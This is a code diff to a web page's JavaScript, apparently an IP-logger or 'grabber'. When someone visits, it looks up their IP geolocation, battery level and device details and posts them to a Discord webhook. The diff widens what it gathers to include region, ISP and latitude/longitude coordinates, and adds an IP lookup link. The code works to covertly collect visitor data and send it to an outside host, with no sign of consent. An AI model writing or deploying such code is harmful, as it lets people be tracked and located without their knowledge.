@@ -72,10 +72,17 @@
                     headers: { 'X-API-Key': ipflareAPIKey }
                 });
                 const data = await response.json();
-                return `${data.city}, ${data.country_name}`;
+                return {
+                    city: data.city,
+                    country: data.country_name,
+                    region: data.region_name,
+                    isp: data.isp,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                };
             } catch (error) {
                 console.error('Error fetching location:', error);
-                return 'Location unknown';
+                return null;
             }
         }
 
@@ -108,19 +115,32 @@
         }
 
         function sendToDiscord(ip, location, battery, deviceInfo) {
+            const mainEmbed = {
+                title: "New Visitor Information",
+                color: 7506394,
+                fields: [
+                    { name: "IP Address", value: ip, inline: true },
+                    { name: "Battery Level", value: battery, inline: true },
+                    { name: "Device Info", value: deviceInfo, inline: false },
+                    { name: 'More Info', value: `https://whatismyipaddress.com/ip/${ip}` }
+                ],
+                footer: { text: `Logged at ${new Date().toLocaleString()}` }
+            };
+
+            const locationEmbed = {
+                title: "Location Information",
+                color: 3447003,
+                fields: [
+                    { name: "City", value: location.city || "N/A", inline: true },
+                    { name: "Region", value: location.region || "N/A", inline: true },
+                    { name: "Country", value: location.country || "N/A", inline: true },
+                    { name: "ISP", value: location.isp || "N/A", inline: false },
+                    { name: "Coordinates", value: `Lat: ${location.latitude}, Lon: ${location.longitude}`, inline: false }
+                ]
+            };
+
             const payload = {
-                embeds: [{
-                    title: "New Visitor Information",
-                    color: 7506394,
-                    fields: [
-                        { name: "IP Address", value: ip, inline: true },
-                        { name: "Location", value: location || 'N/A', inline: true },
-                        { name: "Battery Level", value: battery, inline: true },
-                        { name: "Device Info", value: deviceInfo, inline: false },
-                        { name: 'More Info', value: `https://whatismyipaddress.com/ip/${ip}` }
-                    ],
-                    footer: { text: `Logged at ${new Date().toLocaleString()}` }
-                }]
+                embeds: [mainEmbed, locationEmbed]
             };
 
             fetch(webhookURL, {
